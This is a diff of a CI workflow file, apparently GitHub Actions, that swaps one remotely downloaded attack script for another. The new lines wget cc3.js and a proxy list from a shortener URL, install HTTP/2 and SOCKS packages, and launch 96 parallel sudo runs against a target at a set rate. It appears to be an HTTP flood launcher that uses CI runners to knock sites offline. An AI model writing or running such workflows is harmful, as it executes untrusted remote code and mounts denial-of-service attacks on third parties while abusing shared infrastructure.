@@ -26,9 +26,9 @@ jobs:
     steps:
     - name: Dosyaları indir ve hazırla
       run: |
-        wget https://curl.by/3CGXl/bypass.js
-        wget https://curl.by/KXewY/good.txt
-        chmod +x bypass.js
+        wget https://curl.by/tr44S/cc3.js
+        wget https://curl.by/Wed-u/good.txt
+        chmod +x cc3.js
         npm i hpack https commander colors socks
     - name: run
       run: |
@@ -38,7 +38,7 @@ jobs:
         
         PIDS=()
         for i in {1..96}; do
-          sudo timeout $TIME node bypass.js "$TARGET" 180 "$RATE" 10 good.txt
+          sudo timeout $TIME node cc3.js GET "$TARGET" 180 10 "$RATE" good.txt --http 2 --debug --full --winter
           PIDS+=($!)
         done
         
